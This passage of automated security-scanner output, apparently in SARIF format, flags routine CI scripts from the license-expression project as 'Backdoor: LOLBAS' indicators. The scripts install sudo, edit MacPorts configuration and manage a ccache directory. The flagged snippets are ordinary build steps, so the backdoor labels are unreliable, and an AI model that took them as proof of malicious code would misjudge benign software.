                    "text": "    apt-get -o DPkg::Options::=\"--force-confold\" install -y sudo\n\nelif [[ \"$1\" == \"yum\" ]]; then\n    yum install -y sudo\n\nelif [[ \"$1\" == \"dnf\" ]]; then\n    dnf install -y sudo\n",
                    "rendered": {
                      "text": "    apt-get -o DPkg::Options::=\"--force-confold\" install -y sudo\n\nelif [[ \"$1\" == \"yum\" ]]; then\n    yum install -y sudo\n\nelif [[ \"$1\" == \"dnf\" ]]; then\n    dnf install -y sudo\n",
                      "markdown": "`    apt-get -o DPkg::Options::=\"--force-confold\" install -y sudo\n\nelif [[ \"$1\" == \"yum\" ]]; then\n    yum install -y sudo\n\nelif [[ \"$1\" == \"dnf\" ]]; then\n    dnf install -y sudo\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/install_sudo.sh"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 3,
                  "endLine": 7,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\nif [[ \"$1\" == \"apt-get\" ]]; then\n    apt-get update -y\n    apt-get -o DPkg::Options::=\"--force-confold\" install -y sudo\n\nelif [[ \"$1\" == \"yum\" ]]; then\n    yum install -y sudo\n",
                    "rendered": {
                      "text": "\nif [[ \"$1\" == \"apt-get\" ]]; then\n    apt-get update -y\n    apt-get -o DPkg::Options::=\"--force-confold\" install -y sudo\n\nelif [[ \"$1\" == \"yum\" ]]; then\n    yum install -y sudo\n",
                      "markdown": "`\nif [[ \"$1\" == \"apt-get\" ]]; then\n    apt-get update -y\n    apt-get -o DPkg::Options::=\"--force-confold\" install -y sudo\n\nelif [[ \"$1\" == \"yum\" ]]; then\n    yum install -y sudo\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/install_sudo.sh"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 3,
                  "endLine": 6,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n\nif [[ \"$1\" == \"apt-get\" ]]; then\n    apt-get update -y\n    apt-get -o DPkg::Options::=\"--force-confold\" install -y sudo\n\nelif [[ \"$1\" == \"yum\" ]]; then\n",
                    "rendered": {
                      "text": "\n\nif [[ \"$1\" == \"apt-get\" ]]; then\n    apt-get update -y\n    apt-get -o DPkg::Options::=\"--force-confold\" install -y sudo\n\nelif [[ \"$1\" == \"yum\" ]]; then\n",
                      "markdown": "`\n\nif [[ \"$1\" == \"apt-get\" ]]; then\n    apt-get update -y\n    apt-get -o DPkg::Options::=\"--force-confold\" install -y sudo\n\nelif [[ \"$1\" == \"yum\" ]]; then\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 19,
                  "endLine": 29,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    echo \"COLUMNS=$COLUMNS\" >> \"$GITHUB_ENV\"\nfi\n\n# file to be source at the end of subshell:\nexport MACPORTS_CI_SOURCEME=\"$(mktemp)\"\n\n(\n",
                    "rendered": {
                      "text": "    echo \"COLUMNS=$COLUMNS\" >> \"$GITHUB_ENV\"\nfi\n\n# file to be source at the end of subshell:\nexport MACPORTS_CI_SOURCEME=\"$(mktemp)\"\n\n(\n",
                      "markdown": "`    echo \"COLUMNS=$COLUMNS\" >> \"$GITHUB_ENV\"\nfi\n\n# file to be source at the end of subshell:\nexport MACPORTS_CI_SOURCEME=\"$(mktemp)\"\n\n(\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 303,
                  "startColumn": 16,
                  "endLine": 303,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n)\n\n# allows setting env var if necessary:\nsource \"$MACPORTS_CI_SOURCEME\"\n",
                    "rendered": {
                      "text": "\n)\n\n# allows setting env var if necessary:\nsource \"$MACPORTS_CI_SOURCEME\"\n",
                      "markdown": "`\n)\n\n# allows setting env var if necessary:\nsource \"$MACPORTS_CI_SOURCEME\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 288,
                  "startColumn": 4,
                  "endLine": 288,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\nsudo rm -fr \"$HOME\"/.macports-ci-ccache\nsudo mkdir -p \"$HOME\"/.macports-ci-ccache\nsudo cp -a \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/* \"$HOME\"/.macports-ci-ccache/\n\nesac\n\n",
                    "rendered": {
                      "text": "\nsudo rm -fr \"$HOME\"/.macports-ci-ccache\nsudo mkdir -p \"$HOME\"/.macports-ci-ccache\nsudo cp -a \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/* \"$HOME\"/.macports-ci-ccache/\n\nesac\n\n",
                      "markdown": "`\nsudo rm -fr \"$HOME\"/.macports-ci-ccache\nsudo mkdir -p \"$HOME\"/.macports-ci-ccache\nsudo cp -a \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/* \"$HOME\"/.macports-ci-ccache/\n\nesac\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 281,
                  "startColumn": 6,
                  "endLine": 281,
                  "endColumn": 13,
                  "snippet": {
                    "text": "  sudo mkdir -p \"$MACPORTS_PREFIX\"/var/macports/build/.ccache &&\n  sudo cp -a \"$HOME\"/.macports-ci-ccache/* \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/ &&\n  sudo echo \"max_size = 512M\" > \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/ccache.conf &&\n  sudo chown -R macports:admin \"$MACPORTS_PREFIX\"/var/macports/build/.ccache\n\n;;\n(save)\n",
                    "rendered": {
                      "text": "  sudo mkdir -p \"$MACPORTS_PREFIX\"/var/macports/build/.ccache &&\n  sudo cp -a \"$HOME\"/.macports-ci-ccache/* \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/ &&\n  sudo echo \"max_size = 512M\" > \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/ccache.conf &&\n  sudo chown -R macports:admin \"$MACPORTS_PREFIX\"/var/macports/build/.ccache\n\n;;\n(save)\n",
                      "markdown": "`  sudo mkdir -p \"$MACPORTS_PREFIX\"/var/macports/build/.ccache &&\n  sudo cp -a \"$HOME\"/.macports-ci-ccache/* \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/ &&\n  sudo echo \"max_size = 512M\" > \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/ccache.conf &&\n  sudo chown -R macports:admin \"$MACPORTS_PREFIX\"/var/macports/build/.ccache\n\n;;\n(save)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 279,
                  "startColumn": 6,
                  "endLine": 279,
                  "endColumn": 10,
                  "snippet": {
                    "text": "test -f \"$HOME\"/.macports-ci-ccache/ccache.conf &&\n  sudo rm -fr \"$MACPORTS_PREFIX\"/var/macports/build/.ccache &&\n  sudo mkdir -p \"$MACPORTS_PREFIX\"/var/macports/build/.ccache &&\n  sudo cp -a \"$HOME\"/.macports-ci-ccache/* \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/ &&\n  sudo echo \"max_size = 512M\" > \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/ccache.conf &&\n  sudo chown -R macports:admin \"$MACPORTS_PREFIX\"/var/macports/build/.ccache\n\n",
                    "rendered": {
                      "text": "test -f \"$HOME\"/.macports-ci-ccache/ccache.conf &&\n  sudo rm -fr \"$MACPORTS_PREFIX\"/var/macports/build/.ccache &&\n  sudo mkdir -p \"$MACPORTS_PREFIX\"/var/macports/build/.ccache &&\n  sudo cp -a \"$HOME\"/.macports-ci-ccache/* \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/ &&\n  sudo echo \"max_size = 512M\" > \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/ccache.conf &&\n  sudo chown -R macports:admin \"$MACPORTS_PREFIX\"/var/macports/build/.ccache\n\n",
                      "markdown": "`test -f \"$HOME\"/.macports-ci-ccache/ccache.conf &&\n  sudo rm -fr \"$MACPORTS_PREFIX\"/var/macports/build/.ccache &&\n  sudo mkdir -p \"$MACPORTS_PREFIX\"/var/macports/build/.ccache &&\n  sudo cp -a \"$HOME\"/.macports-ci-ccache/* \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/ &&\n  sudo echo \"max_size = 512M\" > \"$MACPORTS_PREFIX\"/var/macports/build/.ccache/ccache.conf &&\n  sudo chown -R macports:admin \"$MACPORTS_PREFIX\"/var/macports/build/.ccache\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 272,
                  "startColumn": 4,
                  "endLine": 272,
                  "endColumn": 8,
                  "snippet": {
                    "text": "# then tell macports to use it\nCONF=\"${MACPORTS_PREFIX}\"/etc/macports/macports.conf\nawk '{if(match($0,\"configureccache\")) print \"configureccache yes\" ; else print }' \"$CONF\" > $$.tmp\nsudo mv -f $$.tmp \"$CONF\"\n\n# notice that cache size is set to 512Mb, same as it is set by Travis-CI on linux\n# might be changed in the future\n",
                    "rendered": {
                      "text": "# then tell macports to use it\nCONF=\"${MACPORTS_PREFIX}\"/etc/macports/macports.conf\nawk '{if(match($0,\"configureccache\")) print \"configureccache yes\" ; else print }' \"$CONF\" > $$.tmp\nsudo mv -f $$.tmp \"$CONF\"\n\n# notice that cache size is set to 512Mb, same as it is set by Travis-CI on linux\n# might be changed in the future\n",
                      "markdown": "`# then tell macports to use it\nCONF=\"${MACPORTS_PREFIX}\"/etc/macports/macports.conf\nawk '{if(match($0,\"configureccache\")) print \"configureccache yes\" ; else print }' \"$CONF\" > $$.tmp\nsudo mv -f $$.tmp \"$CONF\"\n\n# notice that cache size is set to 512Mb, same as it is set by Travis-CI on linux\n# might be changed in the future\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 270,
                  "startColumn": 52,
                  "endLine": 271,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# first install ccache\nsudo port -N install ccache\n# then tell macports to use it\nCONF=\"${MACPORTS_PREFIX}\"/etc/macports/macports.conf\nawk '{if(match($0,\"configureccache\")) print \"configureccache yes\" ; else print }' \"$CONF\" > $$.tmp\nsudo mv -f $$.tmp \"$CONF\"\n\n# notice that cache size is set to 512Mb, same as it is set by Travis-CI on linux\n",
                    "rendered": {
                      "text": "# first install ccache\nsudo port -N install ccache\n# then tell macports to use it\nCONF=\"${MACPORTS_PREFIX}\"/etc/macports/macports.conf\nawk '{if(match($0,\"configureccache\")) print \"configureccache yes\" ; else print }' \"$CONF\" > $$.tmp\nsudo mv -f $$.tmp \"$CONF\"\n\n# notice that cache size is set to 512Mb, same as it is set by Travis-CI on linux\n",
                      "markdown": "`# first install ccache\nsudo port -N install ccache\n# then tell macports to use it\nCONF=\"${MACPORTS_PREFIX}\"/etc/macports/macports.conf\nawk '{if(match($0,\"configureccache\")) print \"configureccache yes\" ; else print }' \"$CONF\" > $$.tmp\nsudo mv -f $$.tmp \"$CONF\"\n\n# notice that cache size is set to 512Mb, same as it is set by Travis-CI on linux\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 240,
                  "startColumn": 4,
                  "endLine": 240,
                  "endColumn": 8,
                  "snippet": {
                    "text": "SOURCES=\"${MACPORTS_PREFIX}\"/etc/macports/sources.conf\n\nawk -v repo=\"file://$ports\" '{if($NF==\"[default]\") print repo; print}' \"$SOURCES\" > $$.tmp\nsudo mv -f $$.tmp \"$SOURCES\"\n\nportindex\n\n",
                    "rendered": {
                      "text": "SOURCES=\"${MACPORTS_PREFIX}\"/etc/macports/sources.conf\n\nawk -v repo=\"file://$ports\" '{if($NF==\"[default]\") print repo; print}' \"$SOURCES\" > $$.tmp\nsudo mv -f $$.tmp \"$SOURCES\"\n\nportindex\n\n",
                      "markdown": "`SOURCES=\"${MACPORTS_PREFIX}\"/etc/macports/sources.conf\n\nawk -v repo=\"file://$ports\" '{if($NF==\"[default]\") print repo; print}' \"$SOURCES\" > $$.tmp\nsudo mv -f $$.tmp \"$SOURCES\"\n\nportindex\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 238,
                  "endLine": 239,
                  "endColumn": 4,
                  "snippet": {
                    "text": "\necho \"macports-ci: Portdir fullpath: $ports\"\nSOURCES=\"${MACPORTS_PREFIX}\"/etc/macports/sources.conf\n\nawk -v repo=\"file://$ports\" '{if($NF==\"[default]\") print repo; print}' \"$SOURCES\" > $$.tmp\nsudo mv -f $$.tmp \"$SOURCES\"\n\nportindex\n",
                    "rendered": {
                      "text": "\necho \"macports-ci: Portdir fullpath: $ports\"\nSOURCES=\"${MACPORTS_PREFIX}\"/etc/macports/sources.conf\n\nawk -v repo=\"file://$ports\" '{if($NF==\"[default]\") print repo; print}' \"$SOURCES\" > $$.tmp\nsudo mv -f $$.tmp \"$SOURCES\"\n\nportindex\n",
                      "markdown": "`\necho \"macports-ci: Portdir fullpath: $ports\"\nSOURCES=\"${MACPORTS_PREFIX}\"/etc/macports/sources.conf\n\nawk -v repo=\"file://$ports\" '{if($NF==\"[default]\") print repo; print}' \"$SOURCES\" > $$.tmp\nsudo mv -f $$.tmp \"$SOURCES\"\n\nportindex\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 194,
                  "startColumn": 51,
                  "endLine": 194,
                  "endColumn": 56,
                  "snippet": {
                    "text": "# notice that port -N selfupdate && break is not sufficient as a test\n# (sometime it returns a success even though ports have not been installed)\n# for some misterious reasons, running without \"-d\" does not work in some case\n  sudo port -d -N selfupdate 2>&1 | grep -v DEBUG | awk '{if($1!=\"x\")print}'\n  port info xdrfile > /dev/null && break || true\n  sleep 5\n  i=$((i+1))\n",
                    "rendered": {
                      "text": "# notice that port -N selfupdate && break is not sufficient as a test\n# (sometime it returns a success even though ports have not been installed)\n# for some misterious reasons, running without \"-d\" does not work in some case\n  sudo port -d -N selfupdate 2>&1 | grep -v DEBUG | awk '{if($1!=\"x\")print}'\n  port info xdrfile > /dev/null && break || true\n  sleep 5\n  i=$((i+1))\n",
                      "markdown": "`# notice that port -N selfupdate && break is not sufficient as a test\n# (sometime it returns a success even though ports have not been installed)\n# for some misterious reasons, running without \"-d\" does not work in some case\n  sudo port -d -N selfupdate 2>&1 | grep -v DEBUG | awk '{if($1!=\"x\")print}'\n  port info xdrfile > /dev/null && break || true\n  sleep 5\n  i=$((i+1))\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 194,
                  "startColumn": 35,
                  "endLine": 194,
                  "endColumn": 41,
                  "snippet": {
                    "text": "# notice that port -N selfupdate && break is not sufficient as a test\n# (sometime it returns a success even though ports have not been installed)\n# for some misterious reasons, running without \"-d\" does not work in some case\n  sudo port -d -N selfupdate 2>&1 | grep -v DEBUG | awk '{if($1!=\"x\")print}'\n  port info xdrfile > /dev/null && break || true\n  sleep 5\n  i=$((i+1))\n",
                    "rendered": {
                      "text": "# notice that port -N selfupdate && break is not sufficient as a test\n# (sometime it returns a success even though ports have not been installed)\n# for some misterious reasons, running without \"-d\" does not work in some case\n  sudo port -d -N selfupdate 2>&1 | grep -v DEBUG | awk '{if($1!=\"x\")print}'\n  port info xdrfile > /dev/null && break || true\n  sleep 5\n  i=$((i+1))\n",
                      "markdown": "`# notice that port -N selfupdate && break is not sufficient as a test\n# (sometime it returns a success even though ports have not been installed)\n# for some misterious reasons, running without \"-d\" does not work in some case\n  sudo port -d -N selfupdate 2>&1 | grep -v DEBUG | awk '{if($1!=\"x\")print}'\n  port info xdrfile > /dev/null && break || true\n  sleep 5\n  i=$((i+1))\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 177,
                  "startColumn": 6,
                  "endLine": 177,
                  "endColumn": 10,
                  "snippet": {
                    "text": "(tarball)\n  echo \"macports-ci: Using tarball\"\n  awk '{if($NF==\"[default]\") print \"https://distfiles.macports.org/ports.tar.gz [default]\"; else print}' \"$SOURCES\" > $$.tmp\n  sudo mv -f $$.tmp \"$SOURCES\"\n  ;;\n(*)\n  echo \"macports-ci: Unknown sync mode $MACPORTS_SYNC\"\n",
                    "rendered": {
                      "text": "(tarball)\n  echo \"macports-ci: Using tarball\"\n  awk '{if($NF==\"[default]\") print \"https://distfiles.macports.org/ports.tar.gz [default]\"; else print}' \"$SOURCES\" > $$.tmp\n  sudo mv -f $$.tmp \"$SOURCES\"\n  ;;\n(*)\n  echo \"macports-ci: Unknown sync mode $MACPORTS_SYNC\"\n",
                      "markdown": "`(tarball)\n  echo \"macports-ci: Using tarball\"\n  awk '{if($NF==\"[default]\") print \"https://distfiles.macports.org/ports.tar.gz [default]\"; else print}' \"$SOURCES\" > $$.tmp\n  sudo mv -f $$.tmp \"$SOURCES\"\n  ;;\n(*)\n  echo \"macports-ci: Unknown sync mode $MACPORTS_SYNC\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 176,
                  "startColumn": 1,
                  "endLine": 176,
                  "endColumn": 6,
                  "snippet": {
                    "text": "  ;;\n(tarball)\n  echo \"macports-ci: Using tarball\"\n  awk '{if($NF==\"[default]\") print \"https://distfiles.macports.org/ports.tar.gz [default]\"; else print}' \"$SOURCES\" > $$.tmp\n  sudo mv -f $$.tmp \"$SOURCES\"\n  ;;\n(*)\n",
                    "rendered": {
                      "text": "  ;;\n(tarball)\n  echo \"macports-ci: Using tarball\"\n  awk '{if($NF==\"[default]\") print \"https://distfiles.macports.org/ports.tar.gz [default]\"; else print}' \"$SOURCES\" > $$.tmp\n  sudo mv -f $$.tmp \"$SOURCES\"\n  ;;\n(*)\n",
                      "markdown": "`  ;;\n(tarball)\n  echo \"macports-ci: Using tarball\"\n  awk '{if($NF==\"[default]\") print \"https://distfiles.macports.org/ports.tar.gz [default]\"; else print}' \"$SOURCES\" > $$.tmp\n  sudo mv -f $$.tmp \"$SOURCES\"\n  ;;\n(*)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 171,
                  "startColumn": 7,
                  "endLine": 171,
                  "endColumn": 11,
                  "snippet": {
                    "text": "   sudo chown -R $USER:admin github.com\n   git clone https://github.com/macports/macports-ports.git github.com/macports/macports-ports/\n   awk '{if($NF==\"[default]\") print \"file:///opt/local/var/macports/sources/github.com/macports/macports-ports/\"; else print}' \"$SOURCES\" > $HOME/$$.tmp\n   sudo mv -f $HOME/$$.tmp \"$SOURCES\"\n   popd\n  ;;\n(tarball)\n",
                    "rendered": {
                      "text": "   sudo chown -R $USER:admin github.com\n   git clone https://github.com/macports/macports-ports.git github.com/macports/macports-ports/\n   awk '{if($NF==\"[default]\") print \"file:///opt/local/var/macports/sources/github.com/macports/macports-ports/\"; else print}' \"$SOURCES\" > $HOME/$$.tmp\n   sudo mv -f $HOME/$$.tmp \"$SOURCES\"\n   popd\n  ;;\n(tarball)\n",
                      "markdown": "`   sudo chown -R $USER:admin github.com\n   git clone https://github.com/macports/macports-ports.git github.com/macports/macports-ports/\n   awk '{if($NF==\"[default]\") print \"file:///opt/local/var/macports/sources/github.com/macports/macports-ports/\"; else print}' \"$SOURCES\" > $HOME/$$.tmp\n   sudo mv -f $HOME/$$.tmp \"$SOURCES\"\n   popd\n  ;;\n(tarball)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 170,
                  "startColumn": 2,
                  "endLine": 170,
                  "endColumn": 7,
                  "snippet": {
                    "text": "   sudo mkdir -p github.com/macports/macports-ports/\n   sudo chown -R $USER:admin github.com\n   git clone https://github.com/macports/macports-ports.git github.com/macports/macports-ports/\n   awk '{if($NF==\"[default]\") print \"file:///opt/local/var/macports/sources/github.com/macports/macports-ports/\"; else print}' \"$SOURCES\" > $HOME/$$.tmp\n   sudo mv -f $HOME/$$.tmp \"$SOURCES\"\n   popd\n  ;;\n",
                    "rendered": {
                      "text": "   sudo mkdir -p github.com/macports/macports-ports/\n   sudo chown -R $USER:admin github.com\n   git clone https://github.com/macports/macports-ports.git github.com/macports/macports-ports/\n   awk '{if($NF==\"[default]\") print \"file:///opt/local/var/macports/sources/github.com/macports/macports-ports/\"; else print}' \"$SOURCES\" > $HOME/$$.tmp\n   sudo mv -f $HOME/$$.tmp \"$SOURCES\"\n   popd\n  ;;\n",
                      "markdown": "`   sudo mkdir -p github.com/macports/macports-ports/\n   sudo chown -R $USER:admin github.com\n   git clone https://github.com/macports/macports-ports.git github.com/macports/macports-ports/\n   awk '{if($NF==\"[default]\") print \"file:///opt/local/var/macports/sources/github.com/macports/macports-ports/\"; else print}' \"$SOURCES\" > $HOME/$$.tmp\n   sudo mv -f $HOME/$$.tmp \"$SOURCES\"\n   popd\n  ;;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/macports-ci"
                },
                "region": {
                  "startLine": 169,
                  "startColumn": 2,
                  "endLine": 169,
                  "endColumn": 7,
                  "snippet": {
                    "text": "   pushd \"$MACPORTS_PREFIX\"/var/macports/sources\n   sudo mkdir -p github.com/macports/macports-ports/\n   sudo chown -R $USER:admin github.com\n   git clone https://github.com/macports/macports-ports.git github.com/macports/macports-ports/\n   awk '{if($NF==\"[default]\") print \"file:///opt/local/var/macports/sources/github.com/macports/macports-ports/\"; else print}' \"$SOURCES\" > $HOME/$$.tmp\n   sudo mv -f $HOME/$$.tmp \"$SOURCES\"\n   popd\n",
                    "rendered": {
                      "text": "   pushd \"$MACPORTS_PREFIX\"/var/macports/sources\n   sudo mkdir -p github.com/macports/macports-ports/\n   sudo chown -R $USER:admin github.com\n   git clone https://github.com/macports/macports-ports.git github.com/macports/macports-ports/\n   awk '{if($NF==\"[default]\") print \"file:///opt/local/var/macports/sources/github.com/macports/macports-ports/\"; else print}' \"$SOURCES\" > $HOME/$$.tmp\n   sudo mv -f $HOME/$$.tmp \"$SOURCES\"\n   popd\n",
                      "markdown": "`   pushd \"$MACPORTS_PREFIX\"/var/macports/sources\n   sudo mkdir -p github.com/macports/macports-ports/\n   sudo chown -R $USER:admin github.com\n   git clone https://github.com/macports/macports-ports.git github.com/macports/macports-ports/\n   awk '{if($NF==\"[default]\") print \"file:///opt/local/var/macports/sources/github.com/macports/macports-ports/\"; else print}' \"$SOURCES\" > $HOME/$$.tmp\n   sudo mv -f $HOME/$$.tmp \"$SOURCES\"\n   popd\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
